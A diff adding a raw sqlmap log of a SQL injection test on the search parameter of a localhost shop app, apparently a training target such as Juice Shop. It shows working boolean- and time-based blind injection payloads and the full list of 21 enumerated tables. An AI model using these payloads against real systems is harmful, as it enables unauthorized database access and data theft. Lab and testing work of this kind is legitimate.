@@ -1,0 +1,236 @@
+=== SQLMAP SUR /rest/products/search ===
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.10.3#stable}
+|_ -| . [']     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 17:52:02 /2026-04-14/
+
+[17:52:03] [INFO] testing connection to the target URL
+[17:52:03] [INFO] checking if the target is protected by some kind of WAF/IPS
+[17:52:03] [INFO] testing NULL connection to the target URL
+[17:52:03] [INFO] NULL connection is supported with HEAD method ('Content-Length')
+[17:52:03] [INFO] testing if the target URL content is stable
+[17:52:03] [INFO] target URL content is stable
+[17:52:03] [INFO] testing if GET parameter 'q' is dynamic
+[17:52:03] [INFO] GET parameter 'q' appears to be dynamic
+[17:52:04] [WARNING] heuristic (basic) test shows that GET parameter 'q' might not be injectable
+[17:52:04] [INFO] testing for SQL injection on GET parameter 'q'
+[17:52:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[17:52:05] [INFO] GET parameter 'q' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[17:52:05] [INFO] testing 'Generic inline queries'
+[17:52:05] [INFO] testing 'SQLite inline queries'
+[17:52:05] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
+[17:52:05] [WARNING] time-based comparison requires larger statistical model, please wait.......................... (done)
+[17:52:07] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
+[17:52:37] [INFO] GET parameter 'q' appears to be 'SQLite > 2.0 AND time-based blind (heavy query)' injectable 
+for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (3) and risk (2) values? [Y/n] Y
+[17:52:37] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[17:52:37] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[17:52:39] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
+[17:52:40] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
+[17:52:42] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
+[17:52:44] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
+[17:52:46] [INFO] checking if the injection point on GET parameter 'q' is a false positive
+[17:52:48] [WARNING] parameter length constraining mechanism detected (e.g. Suhosin patch). Potential problems in enumeration phase can be expected
+GET parameter 'q' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 168 HTTP(s) requests:
+---
+Parameter: q (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: q=test%' AND 6253=6253 AND 'JIXT%'='JIXT
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: q=test%' AND 3779=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'WuwG%'='WuwG
+---
+[17:52:48] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[17:52:48] [INFO] fetching tables for database: 'SQLite_masterdb'
+[17:52:48] [INFO] fetching number of tables for database 'SQLite_masterdb'
+
+[17:52:48] [INFO] retrieved: 21
+[17:52:49] [INFO] retrieving the length of query output
+
+[17:52:49] [INFO] retrieved: 5
+[17:52:49] [INFO] retrieved: _____
+[17:52:49] [INFO] retrieved: 
+[17:52:53] [INFO] retrieved: Users           
+[17:52:53] [INFO] retrieved: Users
+[17:52:53] [INFO] retrieving the length of query output
+
+[17:52:53] [INFO] retrieved: 15
+[17:52:54] [INFO] retrieved: _______________
+[17:52:54] [INFO] retrieved: 
+[17:53:02] [INFO] retrieved: sqlite_sequence             
+[17:53:02] [INFO] retrieved: sqlite_sequence
+[17:53:02] [INFO] retrieving the length of query output
+
+[17:53:02] [INFO] retrieved: 9
+[17:53:04] [INFO] retrieved: _________
+[17:53:04] [INFO] retrieved: 
+[17:53:08] [INFO] retrieved: Addresses           
+[17:53:08] [INFO] retrieved: Addresses
+[17:53:08] [INFO] retrieving the length of query output
+
+[17:53:08] [INFO] retrieved: 7
+[17:53:09] [INFO] retrieved: _______
+[17:53:09] [INFO] retrieved: 
+[17:53:12] [INFO] retrieved: Baskets           
+[17:53:12] [INFO] retrieved: Baskets
+[17:53:12] [INFO] retrieving the length of query output
+
+[17:53:12] [INFO] retrieved: 8
+[17:53:13] [INFO] retrieved: ________
+[17:53:13] [INFO] retrieved: 
+[17:53:18] [INFO] retrieved: Products           
+[17:53:18] [INFO] retrieved: Products
+[17:53:18] [INFO] retrieving the length of query output
+
+[17:53:18] [INFO] retrieved: 11
+[17:53:19] [INFO] retrieved: ___________
+[17:53:19] [INFO] retrieved: 
+[17:53:24] [INFO] retrieved: BasketItems             
+[17:53:24] [INFO] retrieved: BasketItems
+[17:53:24] [INFO] retrieving the length of query output
+
+[17:53:24] [INFO] retrieved: 8
+[17:53:25] [INFO] retrieved: ________
+[17:53:25] [INFO] retrieved: 
+[17:53:28] [INFO] retrieved: Captchas           
+[17:53:28] [INFO] retrieved: Captchas
+[17:53:28] [INFO] retrieving the length of query output
+
+[17:53:28] [INFO] retrieved: 5
+[17:53:29] [INFO] retrieved: _____
+[17:53:29] [INFO] retrieved: 
+[17:53:31] [INFO] retrieved: Cards           
+[17:53:31] [INFO] retrieved: Cards
+[17:53:31] [INFO] retrieving the length of query output
+
+[17:53:31] [INFO] retrieved: 10
+[17:53:33] [INFO] retrieved: __________
+[17:53:33] [INFO] retrieved: 
+[17:53:40] [INFO] retrieved: Challenges             
+[17:53:40] [INFO] retrieved: Challenges
+[17:53:40] [INFO] retrieving the length of query output
+
+[17:53:40] [INFO] retrieved: 10
+[17:53:41] [INFO] retrieved: __________
+[17:53:41] [INFO] retrieved: 
+[17:53:47] [INFO] retrieved: Complaints             
+[17:53:47] [INFO] retrieved: Complaints
+[17:53:47] [INFO] retrieving the length of query output
+
+[17:53:47] [INFO] retrieved: 10
+[17:53:49] [INFO] retrieved: __________
+[17:53:49] [INFO] retrieved: 
+[17:53:55] [INFO] retrieved: Deliveries             
+[17:53:55] [INFO] retrieved: Deliveries
+[17:53:55] [INFO] retrieving the length of query output
+
+[17:53:55] [INFO] retrieved: 9
+[17:53:56] [INFO] retrieved: _________
+[17:53:56] [INFO] retrieved: 
+[17:54:00] [INFO] retrieved: Feedbacks           
+[17:54:00] [INFO] retrieved: Feedbacks
+[17:54:00] [INFO] retrieving the length of query output
+
+[17:54:00] [INFO] retrieved: 5
+[17:54:01] [INFO] retrieved: _____
+[17:54:01] [INFO] retrieved: 
+[17:54:03] [INFO] retrieved: Hints           
+[17:54:03] [INFO] retrieved: Hints
+[17:54:03] [INFO] retrieving the length of query output
+
+[17:54:03] [INFO] retrieved: 13
+[17:54:04] [INFO] retrieved: _____________
+[17:54:04] [INFO] retrieved: 
+[17:54:10] [INFO] retrieved: ImageCaptchas             
+[17:54:10] [INFO] retrieved: ImageCaptchas
+[17:54:10] [INFO] retrieving the length of query output
+
+[17:54:10] [INFO] retrieved: 8
+[17:54:11] [INFO] retrieved: ________
+[17:54:11] [INFO] retrieved: 
+[17:54:16] [INFO] retrieved: Memories           
+[17:54:16] [INFO] retrieved: Memories
+[17:54:16] [INFO] retrieving the length of query output
+
+[17:54:16] [INFO] retrieved: 15
+[17:54:17] [INFO] retrieved: _______________
+[17:54:17] [INFO] retrieved: 
+[17:54:26] [INFO] retrieved: PrivacyRequests             
+[17:54:26] [INFO] retrieved: PrivacyRequests
+[17:54:26] [INFO] retrieving the length of query output
+
+[17:54:26] [INFO] retrieved: 10
+[17:54:27] [INFO] retrieved: __________
+[17:54:27] [INFO] retrieved: 
+[17:54:33] [INFO] retrieved: Quantities             
+[17:54:33] [INFO] retrieved: Quantities
+[17:54:33] [INFO] retrieving the length of query output
+
+[17:54:33] [INFO] retrieved: 8
+[17:54:33] [INFO] retrieved: ________
+[17:54:33] [INFO] retrieved: 
+[17:54:37] [INFO] retrieved: Recycles           
+[17:54:37] [INFO] retrieved: Recycles
+[17:54:37] [INFO] retrieving the length of query output
+
+[17:54:37] [INFO] retrieved: 17
+[17:54:38] [INFO] retrieved: _________________
+[17:54:38] [INFO] retrieved: 
+[17:54:48] [INFO] retrieved: SecurityQuestions             
+[17:54:48] [INFO] retrieved: SecurityQuestions
+[17:54:48] [INFO] retrieving the length of query output
+
+[17:54:48] [INFO] retrieved: 15
+[17:54:49] [INFO] retrieved: _______________
+[17:54:49] [INFO] retrieved: 
+[17:54:56] [INFO] retrieved: SecurityAnswers             
+[17:54:56] [INFO] retrieved: SecurityAnswers
+[17:54:56] [INFO] retrieving the length of query output
+
+[17:54:56] [INFO] retrieved: 7
+[17:54:56] [INFO] retrieved: _______
+[17:54:56] [INFO] retrieved: 
+[17:55:00] [INFO] retrieved: Wallets           
+[17:55:00] [INFO] retrieved: Wallets
+<current>
+[21 tables]
++-------------------+
+| Addresses         |
+| BasketItems       |
+| Baskets           |
+| Captchas          |
+| Cards             |
+| Challenges        |
+| Complaints        |
+| Deliveries        |
+| Feedbacks         |
+| Hints             |
+| ImageCaptchas     |
+| Memories          |
+| PrivacyRequests   |
+| Products          |
+| Quantities        |
+| Recycles          |
+| SecurityAnswers   |
+| SecurityQuestions |
+| Users             |
+| Wallets           |
+| sqlite_sequence   |
++-------------------+
+
+[17:55:00] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 121 times
+[17:55:00] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/localhost'
+
+[*] ending @ 17:55:00 /2026-04-14/
+
